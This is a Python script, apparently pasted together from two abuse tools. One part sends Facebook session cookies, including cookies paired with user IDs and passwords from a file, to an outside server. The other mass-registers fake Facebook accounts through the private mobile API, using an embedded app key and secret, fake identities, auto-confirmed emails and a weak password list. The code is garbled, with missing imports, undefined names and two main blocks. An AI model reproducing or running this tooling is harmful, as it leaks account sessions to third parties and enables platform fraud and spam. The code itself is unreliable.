# Code by Rebron Bëb 

import requests
import os
import random

class FacebookAppChecker:
    # Colors
    r = '\x1b[1;31m'
    g = '\x1b[1;32m'
    y = '\x1b[1;33m'
    b = '\x1b[1;34m'
    c = '\x1b[1;36m'
    w = '\x1b[1;37m'

    def __init__(self):
        os.system("cls" if os.name == "nt" else "clear")
        self.logo()
        
        print(f"{self.b}-{self.w}" * 56)
        print(f"        {self.g}[//] FacebookAppChecker By Dipak [//]{self.w}")
        print(f"{self.b}-{self.w}" * 56)
        print(f"[1] SINGLE COOKIES")
        print(f"[2] COOKIES FILE")
        print(f"{self.b}-{self.w}" * 56)
        
        choice = input(f"{self.y}[//] Select Option : {self.w}")
        
        print(f"{self.b}-{self.w}" * 56)

        if choice == '1':
            self.process_manual_input()
        elif choice == '2':
            filename = input(f"{self.y}[//] Enter filename: {self.w}")
            self.process_file_input(filename)
        else:
            print(f"{self.r}[//] Invalid choice{self.w}")

    def logo(self):
        # Status
        status_list = ['Online', 'Active', 'Busy', 'Away', 'Do Not Disturb']
        random_status = random.choice(status_list)

        # ------------------ NEPAL ASCII ART ------------------ #
        RED = "\033[1;31m"
        GREEN = "\033[1;32m"
        MAGENTA = "\033[1;35m"
        CYAN = "\033[1;36m"
        YELLOW = "\033[1;33m"
        WHITE = "\033[1;37m"
        BLUE = "\033[1;34m"
        RESET = "\033[0m"

        nepal_logo = f"""
{RED}███╗   ██╗{YELLOW}███████╗{GREEN}██████╗  {CYAN}███╗   ██╗  {MAGENTA}██╗   
{RED}████╗  ██║{YELLOW}██╔════╝{GREEN}██╔══██╗ {CYAN}████╗  ██║  {MAGENTA}██║   
{RED}██╔██╗ ██║{YELLOW}█████╗  {GREEN}██████╔╝ {CYAN}██╔██╗ ██║  {MAGENTA}██║   
{RED}██║╚██╗██║{YELLOW}██╔══╝  {GREEN}██╔═══╝  {CYAN}██║╚██╗██║  {MAGENTA}██║   
{RED}██║ ╚████║{YELLOW}███████╗{GREEN}██║      {CYAN}██║ ╚████║  {MAGENTA}███████╗
{RED}╚═╝  ╚═══╝{YELLOW}╚══════╝{GREEN}╚═╝      {CYAN}╚═╝  ╚═══╝  {MAGENTA}╚══════╝
{RESET}
"""
        print(nepal_logo)

        # ------------------ DIPAK BANNER ------------------ #
        logo = f"""
{self.y}============================================={self.w}
[{self.g}+{self.w}] Owner    : {self.g}Dipak{self.w}
[{self.g}+{self.w}] Facebook : {self.g}Reborn Bëb{self.w}
[{self.g}+{self.w}] Status   : {self.g}{random_status}{self.w}
{self.y}============================================={self.w}
"""
        print(logo)

    # Function to get apps data from server
    def show_apps(self, cookies):
        try:
            response = requests.post(
                'https://shajon404.pythonanywhere.com/facebook_apps',
                json={"cookies": cookies}
            )
            data = response.json()
            return data
        except ValueError:
            return {"all_apps": {"active_apps": {}, "inactive_apps": {}}}

    # Function to display apps nicely
    def display_apps(self, data):
        print(f"{self.b}-{self.w}" * 56)

        # Active apps
        if data['all_apps'].get('active_apps'):
            print(f"{self.g}[//] ACTIVE APPS █{self.w}")
            print(f"{self.b}-{self.w}" * 56)
            for app, date in data['all_apps']['active_apps'].items():
                print(f"{self.g}[//] {app} => {date}{self.w}")
        else:
            print(f"{self.r}[//] No active apps found{self.w}")
        print(f"{self.b}-{self.w}" * 56)

        # Inactive apps
        if data['all_apps'].get('inactive_apps'):
            print(f"{self.c}[//] INACTIVE APPS █{self.w}")
            print(f"{self.b}-{self.w}" * 56)
            for app, date in data['all_apps']['inactive_apps'].items():
                print(f"{self.c}[//] {app} => {date}{self.w}")
        else:
            print(f"{self.r}[//] No inactive apps found{self.w}")
        print(f"{self.b}-{self.w}" * 56)

    # Function to process manual input
    def process_manual_input(self):
        cookies = input(f"[//] COOKIES : {self.g}")
        data = self.show_apps(cookies)
        self.display_apps(data)

    # Function to process file input
    def process_file_input(self, filename):
        try:
            with open(filename, 'r') as f:
                lines = f.readlines()
            for line in lines:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                uid, password, cookies = line.split('|')
                print(f"{self.y}[//] Checking UID : {self.g}{uid}{self.w}")  
                data = self.show_apps(cookies)
                self.display_apps(data)
        except FileNotFoundError:
            print(f"{self.r}[//] File not found: {filename}{self.w}")
        except Exception as e:
            print(f"{self.r}[//] Error: {e}{self.w}")


if __name__ == "__main__":
    FacebookAppChecker()
    COLOR_PURPLE = "\033[0;35m"

# ------------[ BANNER ]-------------- #
run_count = 0
status_list = ['Online', 'Active', 'Busy', 'Away', 'Do Not Disturb']
random_status = random.choice(status_list)

logo = f"""
{WHITE}
   _____      _                       
  |  __ \\    | |                      
  | |__) |___| |__   ___  _ __ _ __   
  |  _  // _ \\ '_ \\ / _ \\| '__| '_ \\  
  | | \\ \\  __/ |_) | (_) | |  | | | | 
  |_|  \\_\\___|_.__/ \\___/|_|  |_| |_|   {YELLOW}XD{WHITE}

=============================================
[+] Owner    : {GREEN}Reborn{WHITE}
[+] Facebook : {GREEN}Reborn Bëb Uchida{WHITE}
[+] Status   : {GREEN}{random_status}{WHITE}
[+] Github   : {YELLOW}Auto Create{WHITE}
[+] Version  : 0.3
[+] Run Count: {run_count}
=============================================
"""

# ------------[ HELPERS ]-------------- #
def clear():
    os.system('clear')
    print(logo)

def linex():
    print(WHITE + '=' * 45)

# ====== APPROVAL SYSTEM ======
def check_approval():
    approved_keys = ["REBORN-2024", "FB-AUTO-KEY", "MYSECRET123"]
    print(f"{WHITE}[?] This script requires approval to run.{RESET}")
    key = input(f"{WHITE}[?] Enter your approval key: {RESET}")
    if key in approved_keys:
        print(f"{GREEN}[✓] Approved! Access granted.{RESET}")
        time.sleep(1)
        return True
    else:
        print(f"{COLOR_LIGHT_RED}[X] Invalid key! Access denied.{RESET}")
        return False

# ====== USER AGENT GENERATOR ======
def ua_base():
    version = f"{random.randint(11,80)}.0.0.{random.randint(9,49)}.{random.randint(11,77)}"
    bversion = random.randint(11111111,99999999)
    return f"[FBAN/FB4A;FBAV/{version};FBBV/{bversion};FBDM={{density=3.0,width=1080,height=1920}};FBLC/en_US;FBRV/279865282;FBCR/Random;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N770F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]"

def ua():
    return random.choice([ua_base() for _ in range(5)])

# ====== EMAIL GENERATOR ======
used_numbers = set()
def generate_unique_number():
    while True:
        num = random.randint(500, 9999)
        if num not in used_numbers:
            used_numbers.add(num)
            return num

def generate_random_emails(length=1, domains=None):
    if domains is None:
        domains = ["yandex.com"]
    emails = []
    for _ in range(length):
        prefix = f"salmankhan{generate_unique_number()}"
        domain = random.choice(domains)
        emails.append(f"{prefix}@{domain}")
    return emails if length > 1 else emails[0]

# ====== LOCK CHECK ======
def lock_checker(uid):
    try:
        r = requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal', timeout=10)
        return 'Active' if 'Photoshop' in r.text else 'Locked'
    except:
        return 'Error'

# ====== RANDOM STRING ======
def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ====== REGISTER FUNCTION ======
def register_facebook_account(password, first_name, last_name, birthday, email):
    session = requests.Session()
    headers = {'User-Agent': ua()}
    api_key = '882a8490361da98702bf97a021ddc14d'
    secret = '62f8ce9f74b12f84c123cc23437a4a32'
    gender = random.choice(['M', 'F'])

    req = {
        'api_key': api_key,
        'attempt_login': True,
        'birthday': birthday.strftime('%Y-%m-%d'),
        'client_country_code': 'US',
        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
        'fb_api_req_friendly_name': 'registerAccount',
        'firstname': first_name,
        'format': 'json',
        'gender': gender,
        'lastname': last_name,
        'email': email,
        'locale': 'en_US',
        'method': 'user.register',
        'password': password,
        'reg_instance': generate_random_string(32),
        'return_multiple_errors': True
    }

    sorted_req = sorted(req.items(), key=lambda x: x[0])
    sig = ''.join(f'{k}={v}' for k, v in sorted_req)
    ensig = hashlib.md5((sig + secret).encode()).hexdigest()
    req['sig'] = ensig

    response = session.post('https://b-api.facebook.com/method/user.register', data=req, headers=headers)
    try:
        reg = response.json()
        uid = reg.get('new_user_id')
        if uid:
            status = lock_checker(uid)
            if status == 'Active':
                time.sleep(5)
                code = 'Not Found'
                try:
                    for _ in range(12):
                        inbox = Email(email).inbox()
                        match = re.search(r'(\d{5})', str(inbox))
                        if match:
                            code = match.group(1)
                            break
                        time.sleep(5)

                    confirm_url = 'https://b-api.facebook.com/method/auth.confirm_email'
                    payload = {
                        'email': email,
                        'code': code,
                        'format': 'json',
                        'access_token': reg.get('session_info', {}).get('access_token', '')
                    }
                    confirm = session.post(confirm_url, data=payload, headers=headers)
                    print(f"[✓] Verified: {email} with code {code}")
                except:
                    code = 'Not Found'

                print(f"{GREEN}[+] Account created successfully!{RESET}")
                print(f"{WHITE}[+] EMAIL  : {email}")
                print(f"[+] UID : {uid}")
                print(f"[+] PASSWORD : {password}")
                print(f"[+] NAME : {first_name} {last_name}")
                print(f"[+] BIRTHDAY : {birthday}{RESET}")
                print(f"[✓] CODE     : {code}")
            else:
                print('[!] ID Locked')
        else:
            print(f'{COLOR_LIGHT_RED}[!] Account Disabled or Failed')
    except Exception as e:
        print(f'[!] Error: {e}')

# Manual password list
manual_passwords = [
    "dipak@123", "ram123$", "maya@123", "jack#5322", "shyam$771_4", "pokhara",
    "maya123", "ktm123", "sagarmatha", "kathmandu", "nepal@123", "dharan",
    "maya@123", "Maya123", "Nepal123", "nepal", "nepal123"
]

# --------------------------[ MAIN MENU ]---------------------------- #
if __name__ == '__main__':
    os.system('clear')
    if not check_approval():
        exit()

    print(f"{WHITE}[1] {COLOR_PURPLE}Auto Create FB Account{RESET}")
    print(f"{WHITE}[0]{COLOR_LIGHT_CYAN}Exit{RESET}")
    linex()
    choice = input(f"{WHITE}[?] {COLOR_BLINK}Select an option: {RESET}")

    if choice == '1':
        fake = Faker()
        try:
            num = int(input(f"{WHITE}[?] Enter number of accounts to create: {RESET}"))
        except:
            num = 1

        emails = generate_random_emails(num, domains=["yandex.com", "mail.com", "tutanota.com"])

        for i in range(num):
            fname = fake.first_name()
            lname = fake.last_name()
            bday = fake.date_of_birth(minimum_age=18, maximum_age=60)

            if i < len(manual_passwords):
                password = manual_passwords[i]
            else:
                password = random.choice(manual_passwords)

            print(f"{GREEN}[Reborn-OK]  {YELLOW}({GREEN}{i+1}{YELLOW}){YELLOW}{WHITE}+{GREEN}OK{YELLOW}({GREEN}{num}{YELLOW}){RESET}")
            register_facebook_account(password, fname, lname, bday, emails[i])


